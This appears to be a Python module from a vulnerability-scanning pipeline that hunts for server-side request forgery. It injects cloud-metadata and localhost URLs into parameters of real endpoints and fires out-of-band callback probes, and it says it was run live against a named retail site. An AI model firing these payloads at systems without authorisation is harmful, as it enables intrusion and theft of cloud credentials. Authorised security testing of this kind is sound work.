#!/usr/bin/env python3
"""
pipeline/detection/ssrf_engine.py

Third real engine on the Detection Engine Framework (after
AccessControlEngine, OpenRedirectEngine). Roadmap Priority 1 item #3
(docs/V2_ROADMAP.md §6).

Candidate generation is the actual "custom, per-target" part this
project keeps building on top of, same idea as pattern_predictor.py:
don't fuzz every parameter on every endpoint. Two evidence layers,
combined:

  1. A curated, real-world list of parameter *names* historically
     correlated with SSRF (Jason Haddix's HUNT param list, collated
     from Bugcrowd submissions and republished by Detectify's SSRF
     research — https://labs.detectify.com/security-guidance/ssrf-vulnerabilities-and-where-to-find-them/).
     This one list is intentionally static/universal, same category as
     access_control_engine.py's PATH_MUTATIONS — some patterns really
     are cross-target constants, not something to "learn" per site.
  2. parameter_intelligence.json — the REAL endpoint->parameter map for
     THIS target (Priority 1 item #2, already built and wired). A
     candidate only exists if this target actually exposes that
     parameter on a real, observed endpoint — never a blind guess at
     "maybe this endpoint takes ?url=". This closes a gap the roadmap
     itself flagged: "each engine parsing urls/all.txt independently
     the way open_redirect_engine.py currently does" — this is the
     first engine to consume parameter_intelligence.json instead of
     re-deriving its own weaker view of the same data.

Verified live on superdrug.com's real parameter_intelligence.json: this
combination surfaces .../wp-json/oembed/1.0/embed?url= — WordPress's
built-in oEmbed proxy, a well-documented real-world SSRF vector — from
data this pipeline already had, with zero new recon.

Detection scope (V1, deliberately not OOB-verified — see below):
  - Reflected-URL: the injected canary URL/host appears verbatim in
    the response body (non-blind SSRF, or a proxy/preview feature that
    echoes what it fetched).
  - Differential-error: an internal/metadata-range payload
    (169.254.169.254, 127.0.0.1, localhost) produces a materially
    different response (status, size, or timing) than a
    guaranteed-never-resolving external baseline
    (ssrf-check.invalid, RFC 2606) — the same
    "timing/status/error-pattern" signal multiple real SSRF write-ups
    describe as the standard way to detect *blind* SSRF without an OOB
    server (see the module's citation in adapters/interactsh.py).
  Neither signal alone is proof — both only ever reach LEAD, same
  discipline as every other engine here; verify() requires stability
  across replay before HIGH_SIGNAL.

Out-of-band (OOB) confirmation: this pipeline already has a real,
correctly-built Interactsh integration (workflow step "🔭 OOB Setup
(Interactsh)" -> "🔭 OOB Check (Interactsh)"), added independently of
this engine, that shells out to the official prebuilt
`interactsh-client` Go binary rather than hand-rolling its
registration/crypto protocol. adapter() below hooks into that EXACT
existing mechanism — same label scheme (md5 of url|param|vuln_class|kind,
same ai_agent/oob_correlation.jsonl file the AI Agent Phase 2 injector
already writes to) — so a real DNS/HTTP callback confirms this engine's
LEAD findings the same way it already confirms Phase 2's. See
pipeline/detection/adapters/interactsh.py for the full contract and why
building a second, separate OOB client here would have been redundant
AND riskier (this project's history is full of bugs from re-deriving
something that already existed correctly elsewhere instead of reusing
it — e.g. open_redirect_engine.py's own note about
parameter_intelligence.json existing for exactly this reason).
"""
from __future__ import annotations

import hashlib
import json
import os
import re
from typing import Callable, Optional
from urllib.parse import quote

from pipeline.detection.engine import Candidate, DetectionEngine, Evidence

# Real AWS/GCP/Azure instance-metadata KEY NAMES — the literal,
# distinctive plaintext IMDSv1 returns for an unauthenticated
# GET /latest/meta-data/ (newline-separated directory listing:
# ami-id, ami-launch-index, iam/, instance-id, instance-type,
# placement/, security-groups, ...). Confirmed-false-positive bug this
# replaces (found on a real superdrug.com run: two candidates hit
# LEAD->HIGH_SIGNAL purely because their response body contained the
# word "metadata" somewhere — completely ordinary, unrelated to SSRF —
# and ai_agent/oob_findings.txt came back EMPTY for both, meaning the
# server never actually attempted the fetch at all): a single generic
# substring like "meta-data" or "169.254.169.254" (which an app can
# echo back in a plain "invalid URL: <what you sent>" error message,
# with zero server-side fetch happening) is not real evidence. Require
# at least TWO of these specific, unlikely-to-appear-elsewhere marker
# tokens together, AND that the match isn't just the payload string
# being echoed back verbatim in an error message.
METADATA_MARKERS = [
    "ami-id", "ami-launch-index", "instance-id", "instance-type",
    "iam/security-credentials", "placement/availability-zone",
    "local-ipv4", "public-keys/", "block-device-mapping",
]

# Jason Haddix's HUNT param-name list (Bugcrowd-derived), as republished
# by Detectify's SSRF research (see module docstring for the citation).
# Deliberately a static, cross-target list — same category as
# access_control_engine.py's PATH_MUTATIONS.
SSRF_PARAM_NAMES = {
    "dest", "redirect", "uri", "path", "continue", "url", "window",
    "next", "data", "reference", "site", "html", "val", "validate",
    "domain", "callback", "return", "page", "feed", "host", "port",
    "to", "out", "view", "dir", "show", "navigation", "open",
    "avatar", "image_url", "image", "img", "picture", "photo",
    "file", "filename", "document", "folder", "root", "path_url",
    "pdf", "load", "src", "source", "proxy", "target", "u",
    "fetch", "load_url", "webhook", "endpoint", "api_url",
    "return_url", "returnurl", "redirect_uri", "redirect_url",
}

INTERNAL_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",  # AWS/GCP/Azure metadata
    "http://127.0.0.1:80/",
    "http://localhost/",
]
# RFC 2606 reserved TLD — never resolves, safe baseline for the
# differential-error comparison (same technique open_redirect_engine.py
# uses for its canary).
BASELINE_CANARY = "http://ssrf-check.invalid/"


class SSRFEngine(DetectionEngine):
    name = "ssrf-v1"

    def __init__(self, prober: Optional[Callable[[str], Optional[dict]]] = None,
                 parameter_map: Optional[dict] = None,
                 max_candidates: int = 60,
                 oob_domain: str = "",
                 oob_correlation_path: Optional[str] = None):
        self.prober = prober or self._no_network_prober
        # parameter_intelligence.json's parsed content, injected rather
        # than read from disk here so this class stays unit-testable
        # with a plain dict — real disk I/O lives in run_ssrf.py.
        self.parameter_map = parameter_map or {"endpoints": []}
        self.max_candidates = max_candidates
        # The base OOB domain this run's interactsh-client session was
        # assigned (workflow's $OOB_DOMAIN, e.g. "abc123.oast.fun") and
        # where to append this engine's correlation records — same file
        # AI Agent Phase 2's payload injector already writes to. Empty
        # string means OOB wasn't available this run (public interactsh
        # servers unreachable, etc.) — adapter() degrades to a no-op,
        # same "continue without this signal, don't fail the engine"
        # rule as everywhere else in this pipeline.
        self.oob_domain = oob_domain
        self.oob_correlation_path = oob_correlation_path

    def _no_network_prober(self, url: str) -> Optional[dict]:
        return None  # no accidental live traffic without an explicit prober

    def prerequisites(self, target_profile: dict) -> bool:
        return bool(self.parameter_map.get("endpoints"))

    def generate_candidates(self, target_profile: dict, vocabulary: dict) -> list[Candidate]:
        # Cross-pollinate the static HUNT list with THIS target's own
        # observed vocabulary — a word this target itself uses that
        # merely *contains* a known SSRF-relevant root (e.g. this
        # target's own "avatar_upload_url") also counts as evidence,
        # not just an exact name match.
        target_words = {
            w for w in vocabulary
            if any(hint in w.lower() for hint in
                   ("url", "uri", "webhook", "callback", "proxy", "fetch",
                    "domain", "host", "feed", "avatar", "image", "src",
                    "redirect", "endpoint", "remote", "source"))
        }
        relevant_names = SSRF_PARAM_NAMES | target_words

        candidates: list[Candidate] = []
        for endpoint in self.parameter_map.get("endpoints", []):
            ep_url = endpoint.get("endpoint")
            if not ep_url:
                continue
            for p in endpoint.get("parameters", []):
                pname = p.get("name", "")
                if pname.lower() not in relevant_names:
                    continue
                sep = "&" if "?" in ep_url else "?"
                candidates.append(Candidate(
                    target=f"{ep_url}{sep}{pname}={{PAYLOAD}}",
                    engine=self.name,
                    evidence_sources=p.get("sources", []),
                    metadata={"parameter": pname, "endpoint": ep_url},
                ))
                if len(candidates) >= self.max_candidates:
                    return candidates
        return candidates

    def _fetch(self, target_template: str, payload: str) -> Optional[dict]:
        url = target_template.replace("{PAYLOAD}", quote(payload, safe=""))
        return self.prober(url)

    @staticmethod
    def _reflects_real_metadata(body: str, payload: str) -> Optional[str]:
        """Returns a comma-joined string of matched marker tokens if the
        body contains >=2 distinct real cloud-metadata markers, else
        None. Strips the injected payload string out first, so an app
        that just echoes "invalid URL: <what you sent>" back in an
        error message never counts — that reflects the REQUEST, not
        actual fetched metadata content."""
        if not body:
            return None
        stripped = body.replace(payload, "")
        lowered = stripped.lower()
        matched = [m for m in METADATA_MARKERS if m in lowered]
        if len(matched) >= 2:
            return ", ".join(matched)
        return None

    def detect(self, candidate: Candidate) -> Optional[Evidence]:
        baseline = self._fetch(candidate.target, BASELINE_CANARY)
        if baseline is None:
            return None  # no network available — nothing to evaluate

        # Signal 1: reflected URL/host in the response body — the
        # strongest single-request signal (non-blind SSRF). Requires
        # at least 2 distinctive real-metadata markers, not a bare
        # "metadata"/"169.254..." substring — see METADATA_MARKERS'
        # comment for the real false positive this closes.
        for internal_payload in INTERNAL_PAYLOADS:
            result = self._fetch(candidate.target, internal_payload)
            if result is None:
                continue
            body = (result.get("body") or "")
            if self._reflects_real_metadata(body, internal_payload):
                return Evidence(
                    candidate=candidate, classification="LEAD",
                    reason=(
                        f"response body contains multiple real cloud-metadata "
                        f"markers ({self._reflects_real_metadata(body, internal_payload)}) "
                        f"after injecting {internal_payload!r} into parameter "
                        f"'{candidate.metadata.get('parameter')}' — possible "
                        f"non-blind SSRF"
                    ),
                    details={"payload": internal_payload, "signal": "reflected_body"},
                )

            # Signal 2: differential error/status between an internal
            # payload and the never-resolving baseline. A same-shaped
            # response for both is NOT evidence — plenty of apps just
            # 400 on any malformed/unrecognized URL regardless of
            # target. Only a *difference* is worth a LEAD.
            if (result.get("status") != baseline.get("status")
                    or abs(result.get("elapsed_ms", 0) - baseline.get("elapsed_ms", 0)) > 3000):
                return Evidence(
                    candidate=candidate, classification="LEAD",
                    reason=(
                        f"internal-range payload {internal_payload!r} produced a "
                        f"different response than the never-resolving baseline "
                        f"(status {result.get('status')} vs {baseline.get('status')}, "
                        f"Δtiming {abs(result.get('elapsed_ms', 0) - baseline.get('elapsed_ms', 0))}ms) "
                        f"— the server likely attempted the fetch differently; "
                        f"classic blind-SSRF differential signal, not proof"
                    ),
                    details={
                        "payload": internal_payload,
                        "signal": "differential_response",
                        "internal_status": result.get("status"),
                        "baseline_status": baseline.get("status"),
                    },
                )

        return Evidence(
            candidate=candidate, classification="NOISE",
            reason="internal-range payloads behaved identically to the baseline — no signal",
        )

    def adapter(self, candidate: Candidate, detect_evidence: Evidence) -> Optional[Evidence]:
        """Escalate a LEAD to the pipeline's existing Interactsh session
        (see module docstring): register this exact (url, param) under
        a unique label in ai_agent/oob_correlation.jsonl — the SAME
        format/file AI Agent Phase 2 already writes, so the shared
        "🔭 OOB Check" workflow step picks it up with no changes needed
        there — then actually fire one request with the labeled OOB
        subdomain as the payload so the target's server has a chance to
        make the real callback. This does NOT poll for the callback
        itself (the OOB Check step does that once, later, for every
        phase's labels together) — it only ever *registers and fires*,
        matching the one-shot fire pattern already established.
        """
        if detect_evidence.classification != "LEAD" or not self.oob_domain or not self.oob_correlation_path:
            return detect_evidence  # no OOB session this run — LEAD stands, needs manual confirmation

        endpoint = candidate.metadata.get("endpoint", "")
        param = candidate.metadata.get("parameter", "")
        label = hashlib.md5(f"{endpoint}|{param}|ssrf|ssrf-v1".encode()).hexdigest()[:12]
        try:
            os.makedirs(os.path.dirname(self.oob_correlation_path), exist_ok=True)
            with open(self.oob_correlation_path, "a") as f:
                f.write(json.dumps({
                    "label": label, "url": endpoint, "param": param, "vuln_class": "ssrf",
                }) + "\n")
        except OSError:
            return detect_evidence  # couldn't register — degrade to the un-escalated LEAD, don't crash

        oob_payload = f"http://{label}.{self.oob_domain}/"
        self._fetch(candidate.target, oob_payload)  # fire-and-forget; OOB Check reads the result later

        detect_evidence.details["oob_label"] = label
        detect_evidence.details["oob_probe_fired"] = True
        detect_evidence.details["oob_confirmed"] = False  # OOB Check step may flip later
        detect_evidence.reason += (
            f"; OOB probe FIRED (label={label}) on shared interactsh session — "
            f"NOT confirmed until ai_agent/oob_findings.txt lists this label after "
            f"'OOB Check' (empty oob_findings = differential-only, not OOB-confirmed)"
        )
        return detect_evidence

    def verify(self, evidence: Evidence) -> Evidence:
        if evidence.classification != "LEAD":
            return evidence

        candidate = evidence.candidate
        payload = evidence.details.get("payload", INTERNAL_PAYLOADS[0])
        replay = [self._fetch(candidate.target, payload) for _ in range(2)]
        if any(r is None for r in replay):
            evidence.stable = None
            evidence.reason += "; replay incomplete (prober returned nothing) — confidence not raised"
            return evidence

        signal = evidence.details.get("signal")
        if signal == "reflected_body":
            stable = all(self._reflects_real_metadata(r.get("body") or "", payload) for r in replay)
        else:
            baseline_replay = self._fetch(candidate.target, BASELINE_CANARY)
            stable = baseline_replay is not None and all(
                r.get("status") != baseline_replay.get("status")
                or abs(r.get("elapsed_ms", 0) - baseline_replay.get("elapsed_ms", 0)) > 3000
                for r in replay
            )
        evidence.stable = stable
        if stable:
            evidence.classification = "HIGH_SIGNAL"
            evidence.reason += "; stable across 2 replays — HIGH_SIGNAL (differential only unless oob_findings confirms label)"
        else:
            evidence.reason += "; unstable across replay — NOT promoted, confidence lowered"
        return evidence
